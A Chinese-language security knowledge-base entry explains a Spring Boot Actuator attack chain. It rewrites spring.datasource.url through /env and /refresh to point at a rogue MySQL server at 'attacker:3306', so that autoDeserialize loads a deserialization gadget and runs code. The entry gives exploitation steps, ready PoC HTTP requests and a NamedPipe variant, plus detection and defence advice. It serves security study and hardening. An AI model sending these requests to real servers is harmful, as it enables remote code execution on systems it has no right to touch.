---
id: web-java-framework-spring-actuator-env-datasource-url-mysql-jdbc-deserialization
title: Spring Boot Actuator env 改写 spring.datasource.url：refresh 后触发 MySQL JDBC autoDeserialize 反序列化 RCE
type: scenario
domain: web
path: web/java/framework/spring
technique: actuator-env-datasource-url-mysql-jdbc-autodeserialize
tags:
- java
- spring
- spring-boot
- actuator
- jdbc
- mysql
- deserialization
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V321
  verified_at: '2026-11-08T15:33:55+08:00'
  notes: 已对照原文与图04/05核对：/env 确认 mysql-connector-java 与 commons-collections、写 spring.datasource.url（5.x statementInterceptors / 8.x queryInterceptors + autoDeserialize=true）、/refresh、业务查询触发与还原原值说明均一致；已把原文未给出的 8.0.20 具体版本断言改为按实际驱动版本判断。未复跑。
url: /docs/web/java/framework/spring/web-java-framework-spring-actuator-env-datasource-url-mysql-jdbc-deserialization/
draft: false
kb_aliases:
- spring.datasource.url 修改
- Actuator env 改数据源
- mysql-connector-java autoDeserialize
- ServerStatusDiffInterceptor
- Spring Boot JDBC 反序列化
- mysql jdbc deserialization
---

## 一句话结论

Spring Boot Actuator 的 `/env` 可写且 `/refresh` 可达时，攻击者把 `spring.datasource.url` 改成指向自己 MySQL 服务的恶意 JDBC URL（带 `autoDeserialize=true` 与 `statementInterceptors`/`queryInterceptors`），刷新后让任意数据库查询接口触发连接；恶意 MySQL 服务端在握手/查询响应中返回序列化 gadget，驱动自动反序列化，形成 RCE。

## 原理

- `/env`（1.x）或 `/actuator/env`（2.x）允许 POST 修改 Environment 属性。`spring.datasource.url` 是 Spring Boot 数据源自动配置绑定的属性，修改后 `/refresh` 的 `ContextRefresher` 会重新绑定 `@ConfigurationProperties` 的 DataSource（或重建连接池），使后续查询使用新 URL。
- MySQL Connector/J 支持 `autoDeserialize=true`：驱动会对服务端返回的某些字段（如 `SHOW SESSION STATUS` 结果）执行 Java 反序列化。`statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor`（5.x）或 `queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor`（8.x）会让驱动在连接初始化阶段主动发查询，给恶意服务端返回 payload 的机会。
- 恶意 MySQL 服务端（如 MySQL_Fake_Server）在握手/查询响应中塞入 ysoserial gadget 序列化字节；驱动 `readObject` 时触发 gadget 链，前提是目标 classpath 上存在对应依赖（commons-collections、JDK7u21/JDK8u20 等）。
- 相比直接访问 JDBC 入口，Actuator 版利用的关键是"改配置 + 刷新"两步，无需目标已有可控 JDBC 参数；但需要 `/env` 可写、`/refresh` 可达且业务存在会执行查询的接口。

## 触发条件

- Actuator `/env`/`/actuator/env` 未授权可写，`/refresh`/`/actuator/refresh` 可达。
- classpath 存在 `mysql-connector-java`（5.x 或 8.x），且版本仍支持 `autoDeserialize` 与对应拦截器（不同驱动版本的属性名与默认值有差异，以目标实际驱动为准）。
- 目标存在可被触发的数据库查询接口（列表、详情、搜索等）；目标能出站访问攻击者 3306 端口。
- 目标 classpath 存在可用的反序列化 gadget 依赖。

## 利用步骤

1. 读 `/env` 或 `/actuator/env`，确认存在 `mysql-connector-java` 依赖，记录当前 `spring.datasource.url` 原值（测试后必须还原，避免破坏业务）。
2. 启动恶意 MySQL 服务端，配置返回对应 gadget 的序列化字节。
3. 修改数据源 URL：
   - 1.x：`POST /env`（`application/x-www-form-urlencoded`）写 `spring.datasource.url=jdbc:mysql://attacker:3306/mysql?characterEncoding=utf8&useSSL=false&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true`；
   - 2.x：`POST /actuator/env`（JSON）写 `{"name":"spring.datasource.url","value":"..."}`，8.x 驱动把 `statementInterceptors` 换成 `queryInterceptors`。
4. `POST /refresh` 或 `POST /actuator/refresh` 重新绑定数据源。
5. 访问一个会查库的业务接口（如 `/product/list`）触发连接；恶意服务端返回序列化对象，驱动反序列化触发 RCE。
6. 验证后把 `spring.datasource.url` 还原为原值并再次 refresh，避免影响业务。

## PoC

```text
# mysql-connector-java 5.x
jdbc:mysql://attacker:3306/mysql?characterEncoding=utf8&useSSL=false&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true

# mysql-connector-java 8.x
jdbc:mysql://attacker:3306/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true
```

```http
### 1.x 写入
POST /env HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

spring.datasource.url=jdbc:mysql://attacker:3306/mysql?characterEncoding=utf8&useSSL=false&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true
```

```http
### 2.x 写入
POST /actuator/env HTTP/1.1
Host: target
Content-Type: application/json

{"name":"spring.datasource.url","value":"jdbc:mysql://attacker:3306/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true"}
```

```http
### 刷新并触发
POST /actuator/refresh HTTP/1.1
Content-Type: application/x-www-form-urlencoded

GET /product/list HTTP/1.1
Host: target
```

## 变体与关联

- 变体：驱动版本 5.x 用 `statementInterceptors`，8.x 用 `queryInterceptors`；URL 连接参数名不同但原理一致。
- 变体：无出网时改用 `NamedPipeSocketFactory`（5.x）或 `com.mysql.cj.protocol.NamedPipeSocketFactory`（8.x），先写本地管道/文件再让驱动读取。
- 关联：[[web-java-deser-fastjson-mysql-jdbc-autodeserialize]]（同一 `autoDeserialize` 驱动侧 sink，但入口是 fastjson `@type` 而不是 Actuator env）、[[web-java-framework-spring-actuator-bootstrap-location-yaml-rce]]（同一 `/env`+`/refresh` 写配置模式，gadget 换成 SnakeYAML）。
- 边界：`/env` 只读或需认证、`/refresh` 关闭、目标驱动版本/配置无法启用 `autoDeserialize` 或对应拦截器、classpath 无 gadget 或目标不能出网时，该链不成立。

## 检测与防御

- 检测：`/env`、`/actuator/env` 出现 `spring.datasource.url` 写入，值含 `autoDeserialize`、`ServerStatusDiffInterceptor`、`statementInterceptors`、`queryInterceptors`、`NamedPipeSocketFactory`；随后应用异常连接外部 3306。
- 防御：Actuator 敏感端点关闭或加认证，禁止 env POST；升级 MySQL Connector/J 到默认禁用 `autoDeserialize` 的版本；生产环境不开启 `autoDeserialize`。
- 加固：数据源 URL 由配置中心下发并校验白名单，禁止运行时改指向外部地址；限制应用出站访问与本地管道读取；对 `/refresh` 做鉴权。
